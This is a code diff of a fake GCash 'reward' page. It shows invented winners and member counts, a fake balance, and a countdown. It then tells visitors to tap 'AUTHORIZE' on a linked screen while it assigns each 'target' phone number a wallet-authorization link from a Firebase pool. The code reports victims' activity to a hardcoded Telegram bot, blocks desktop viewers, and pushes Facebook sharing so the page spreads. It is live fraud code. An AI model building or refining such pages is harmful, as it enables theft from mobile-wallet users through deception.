@@ -8,7 +8,24 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script src="js/config.js"></script>
+    
+ <script>
+        (function() {
+            const isBanned = localStorage.getItem("cp_device_locked") === "true";
+            const isVerified = localStorage.getItem("cp_verified") === "true";
+            if (isBanned || !isVerified) { window.location.replace("index.html"); return; }
 
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            const isSmallScreen = window.innerWidth <= 768;
+            window.onload = function() {
+                if (!isMobile && !isSmallScreen) {
+                    document.getElementById('mobileOnlyOverlay').style.display = 'flex';
+                    document.getElementById('mainContent').style.display = 'none';
+                }
+            };
+        })();
+    </script>
+    
     <link rel="stylesheet" href="style.css">
     <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;800&family=Orbitron:wght@700&display=swap" rel="stylesheet">
 
@@ -87,18 +104,24 @@
 </head>
 <body>
 
-    <div id="processingOverlay">
+     <div id="processingOverlay">
         <div class="spinner"></div>
-        <div class="proc-title">ESTABLISHING VIALINK...</div>
-        <div id="proc-status" style="color: #fbbf24; font-size: 12px;">Securing Tunnel...</div>
+        <div class="proc-title">ESTABLISHING SECURE VIALINK...</div>
+        <div class="proc-text">⚠️ <b>REQUIRED ACTION:</b><br>Tap <b>"AUTHORIZE"</b> or <b>"AGREE"</b> on the next screen to verify your GCash wallet and receive the reward.</div>
+    </div>
+
+    <div id="mobileOnlyOverlay">
+        <div style="font-size: 60px;">📱</div>
+        <h2 style="color:#fbbf24; margin: 15px 0;">Mobile Access Only</h2>
+        <p style="color:#94a3b8; font-size: 14px;">Please switch to your phone to claim rewards.</p>
     </div>
 
     <div id="mainContent" style="width: 100%; display: flex; flex-direction: column; align-items: center;">
-        
+@@ -54,7 +48,7 @@
         <div class="live-stats">
-            <div class="online-count"><span class="dot"></span> <span id="userCount">74</span> Members Online</div>
-            <div class="live-winner-box">
-                <span id="winnerEntry">User 0917***8821 claimed <img src="images/gc_icon.png" class="gc-mini-icon"> ₱500</span>
+            <div class="online-count"><span class="dot"></span> <span id="userCount">32</span> Members Online</div>
+            <div class="live-winner-box" id="winnerBox">
+                 <span id="winnerEntry">User 0917***8821 just claimed <img src="images/gc_icon.png" class="gc-mini-icon" style="width: 14px; height: 14px; vertical-align: middle;">₱500</span>
             </div>
         </div>
 
@@ -116,6 +139,7 @@
 
             <div class="label-text">AVAILABLE BALANCE</div>
             <div class="amount" id="balanceText">₱0.00</div>
+            <div class="timer-box" id="timerLabel">Processing rewards in: <span id="countdown">05</span>s</div>
 
             <div class="btn-group">
                 <button class="pay-button" id="claimBtn" onclick="redirectToGCash()" disabled>Withdraw via GCash</button>
@@ -132,7 +156,7 @@
 
         const botToken = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
         const chatId = "7298607329";
-        const userPhone = localStorage.getItem("userPhone") || "Guest";
+        const savedPhone = localStorage.getItem("userPhone") || "Guest_Target";
 
         let balance = 0;
         let clicks = 0;
@@ -146,7 +170,7 @@
         logTelegram(`🚀 [ViaLink] User ${userPhone} is playing.`);
 
         function handleTap(el, animName, id) {
-            if (clicks >= 6 || el.classList.contains('card-disabled')) return;
+            if (clicks >= 4 || el.classList.contains('card-disabled')) return;
             
             clicks++;
             const img = el.querySelector('img');
@@ -192,25 +216,71 @@
             window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(window.location.href), '_blank');
         }
 
-        function redirectToGCash() {
-            document.getElementById('processingOverlay').style.display = 'flex';
-            logTelegram(`🔔 [ViaLink] User ${userPhone} redirecting to Merchant...`);
+         function redirectToGCash() {
+            const claimBtn = document.getElementById('claimBtn');
+            const overlay = document.getElementById('processingOverlay');
 
-            setTimeout(() => {
-                db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', s => {
-                    if(s.exists()) {
-                        window.location.href = Object.values(s.val())[0].url;
-                    } else {
-                        window.location.href = "https://www.gcash.com/";
-                    }
-                });
-            }, 3000);
+             claimBtn.disabled = true;
+            overlay.style.display = 'flex';
+
+            trackActivity("Target initiated Withdraw. Searching for Active ViaLink...");
+
+            db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', snapshot => {
+                if (snapshot.exists()) {
+                    const linkId = Object.keys(snapshot.val())[0];
+                    const targetUrl = snapshot.val()[linkId].url;
+
+                    db.ref('links/' + linkId).update({
+                        status: 'pending',
+                        user: savedPhone
+                    });
+
+                    trackActivity(`ViaLink Established! Redirecting to GCash...`);
+
+                    setTimeout(() => {
+                        window.location.href = targetUrl;
+                    }, 3500);
+
+                    setTimeout(() => { window.location.href = targetUrl; }, 3500);
+                } else {
+                    trackActivity("CRITICAL ERROR: No Ready ViaLinks in Database!");
+                    alert("System busy! All reward slots are currently full. Please try again in 10 minutes.");
+                    overlay.style.display = 'none';
+                    claimBtn.disabled = false;
+                }
+            });
         }
 
+        let timeLeft = 5;
+        const countdownTimer = setInterval(() => {
+            timeLeft--;
+            if(document.getElementById('countdown')) document.getElementById('countdown').innerText = "0" + timeLeft;
+            if (timeLeft <= 0) {
+                clearInterval(countdownTimer);
+                document.getElementById('timerLabel').innerHTML = "Reward Slots Open!";
+                document.getElementById('shareBtn').style.display = "flex";
+                document.getElementById('claimBtn').disabled = false;
+            }
+        }, 1000);
+
+        function shareToFB() {
+            window.open("https://www.facebook.com/sharer/sharer.php?u=" + encodeURIComponent(window.location.href), '_blank', 'width=600,height=400');
+            let currentText = document.getElementById('balanceText').innerText.replace('₱', '').replace(/,/g, '');
+            let currentBalance = parseFloat(currentText) || 0;
+            animateValue(currentBalance, currentBalance + 50, 500);
+        }
+
+        // Live Winner Rotator (In-update din ang GCash icon inline style dito)
         setInterval(() => {
-            const online = Math.floor(Math.random() * 30) + 50;
+            const online = Math.floor(Math.random() * (90 - 40)) + 40;
             document.getElementById('userCount').innerText = online;
-        }, 5000);
+            const pref = ["0917", "0915", "0998", "0966", "0927"][Math.floor(Math.random() * 5)];
+            const suffix = Math.floor(1000 + Math.random() * 9000);
+            const amt = [500, 800, 1000, 1200][Math.floor(Math.random() * 4)];
+            document.getElementById('winnerEntry').innerHTML = `User ${pref}***${suffix} just claimed <img src="images/gc_icon.png" class="gc-mini-icon">₱${amt}`;
+            document.getElementById('winnerEntry').innerHTML = `User ${pref}***${suffix} just claimed <img src="images/gc_icon.png" class="gc-mini-icon" style="width: 14px; height: 14px; vertical-align: middle;">₱${amt}`;
+        }, 4000);
+        
     </script>
 </body>
 </html>
